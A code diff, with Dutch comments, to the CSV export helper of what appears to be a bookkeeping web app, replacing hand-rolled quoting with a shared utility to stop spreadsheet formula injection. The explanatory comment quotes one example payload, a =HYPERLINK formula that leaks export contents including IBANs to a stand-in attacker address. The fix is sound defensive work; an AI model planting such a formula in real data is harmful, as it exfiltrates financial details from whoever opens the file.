@@ -6,6 +6,7 @@ import { asyncHandler, ApiError } from '../middleware/errorHandler';
 import { logAuditEvent } from './audit-logs';
 import logger from '../utils/logger';
 import { z } from 'zod';
+import { csvBestand } from '../utils/csv';
 
 const router = Router();
 
@@ -3572,20 +3573,36 @@ router.get(
 // EXPORT ENDPOINTS
 // =====================================================
 
-// Helper function to convert data to CSV
+/**
+ * Zet gegevens om naar CSV voor de zes boekhoudexports.
+ *
+ * De eigen veldopbouw die hier stond quootte netjes volgens RFC 4180, maar
+ * liet formule-injectie staan: een relatienaam of omschrijving die met `=`,
+ * `+`, `-` of `@` begint wordt door Excel, LibreOffice en Google Sheets
+ * uitgevoerd zodra de penningmeester het bestand opent. Een relatie die
+ * `=HYPERLINK("http://kwaad/"&A1,"klik")` heet stuurt dan de inhoud van de
+ * export - inclusief IBAN's uit de relatielijst - naar een adres van de
+ * aanvaller, en de penningmeester ziet alleen een link. Aanhalingstekens
+ * helpen daar niet tegen: die zijn CSV-syntaxis en worden bij het inlezen
+ * weggehaald voordat de cel geëvalueerd wordt.
+ *
+ * Puntkomma als scheidingsteken en de komma als decimaalteken blijven zoals
+ * ze waren: dat is wat Excel in deze regio verwacht, en elke afwijking breekt
+ * de import bij iedereen die deze exports al gebruikt. csvVeld doet allebei
+ * zodra het scheidingsteken `;` is.
+ *
+ * De kopregel gaat door dezelfde weg als de gegevens. Die teksten staan vast
+ * in de code en kunnen dus nooit gevaarlijk zijn, maar een uitzondering
+ * ervoor levert alleen een tweede pad op dat apart moet blijven kloppen - en
+ * geen enkele kop begint met een van die tekens, dus er verandert niets aan
+ * de uitvoer.
+ */
 function toCSV(data: any[], columns: { key: string; header: string }[]): string {
-  const headers = columns.map((c) => `"${c.header}"`).join(';');
-  const rows = data.map((row) =>
-    columns
-      .map((c) => {
-        const value = row[c.key];
-        if (value === null || value === undefined) return '';
-        if (typeof value === 'number') return value.toString().replace('.', ',');
-        return `"${String(value).replace(/"/g, '""')}"`;
-      })
-      .join(';'),
+  return csvBestand(
+    columns.map((c) => c.header),
+    data.map((row) => columns.map((c) => row[c.key])),
+    ';',
   );
-  return [headers, ...rows].join('\n');
 }
 
 // Export transactions (grootboek)
